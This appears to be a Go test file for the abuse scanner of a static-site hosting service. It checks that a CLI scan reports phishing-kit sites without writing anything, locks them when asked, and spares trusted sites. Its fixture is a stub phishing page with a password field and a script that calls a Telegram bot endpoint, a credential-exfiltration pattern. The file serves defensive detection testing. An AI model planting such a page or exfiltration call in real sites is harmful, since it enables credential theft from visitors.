package main

import (
	"bytes"
	"strings"
	"testing"

	"github.com/ittrail/sitebin.io/internal/abuse"
	"github.com/ittrail/sitebin.io/internal/store"
)

const cliKit = `<title>Account Verification</title><input type="password"><script>fetch("https://api.telegram.org/bot1:a/sendMessage")</script>`

// sitesFromBefore makes a kit site, a trusted site with the same kit and a
// clean one, as they would be on disk from before the scanner.
func sitesFromBefore(t *testing.T, st *store.Store) (kit, trusted, clean *store.Site) {
	t.Helper()
	st.SetScanner(nil)
	kit, _, _ = st.Create()
	st.SaveFile(kit, "index.html", strings.NewReader(cliKit))
	trusted, _, _ = st.Create()
	st.SetTrusted(trusted, true)
	st.SaveFile(trusted, "index.html", strings.NewReader(cliKit))
	clean, _, _ = st.Create()
	st.SaveFile(clean, "index.html", strings.NewReader("<p>hello</p>"))
	st.SetScanner(abuse.NewLoader(""))
	return kit, trusted, clean
}

func TestCLIScanReportsWithoutWriting(t *testing.T) {
	st := cliStore(t)
	kit, trusted, clean := sitesFromBefore(t, st)
	var out bytes.Buffer
	if err := scanSites(st, &out, "", true, false); err != nil {
		t.Fatal(err)
	}
	o := out.String()
	if !strings.Contains(o, kit.ViewID) || !strings.Contains(o, "telegram-bot-api") || !strings.Contains(o, "would be HELD") {
		t.Errorf("report:\n%s", o)
	}
	if !strings.Contains(o, trusted.ViewID) || !strings.Contains(o, store.DecisionTrusted) || strings.Contains(o, clean.ViewID) {
		t.Errorf("report:\n%s", o)
	}
	if !strings.Contains(o, "1 would be held") {
		t.Errorf("summary:\n%s", o)
	}
	for _, s := range []*store.Site{kit, trusted} {
		got, _ := st.ByViewID(s.ViewID)
		if got.Meta.Locked != nil || got.Meta.Abuse != nil {
			t.Errorf("a report-only scan wrote to %s", s.ViewID)
		}
	}
}

func TestCLIScanLocks(t *testing.T) {
	st := cliStore(t)
	kit, trusted, _ := sitesFromBefore(t, st)
	var out bytes.Buffer
	if err := scanSites(st, &out, kit.EditID, false, true); err != nil {
		t.Fatal(err)
	}
	got, _ := st.ByViewID(kit.ViewID)
	if got.Meta.Locked == nil || got.Meta.Locked.By != store.LockByScanner || got.Meta.Abuse.Findings[0].Source != store.FindingScan {
		t.Fatalf("after --lock: %+v", got.Meta)
	}
	if !strings.Contains(out.String(), "now HELD") {
		t.Errorf("output:\n%s", out.String())
	}
	out.Reset()
	scanSites(st, &out, "", true, true)
	if got, _ := st.ByViewID(trusted.ViewID); got.Meta.Locked != nil {
		t.Error("--lock locked a trusted site")
	}
	if err := scanSites(st, &out, "nosuchsite", false, false); err == nil {
		t.Error("an unknown site is an error")
	}
}
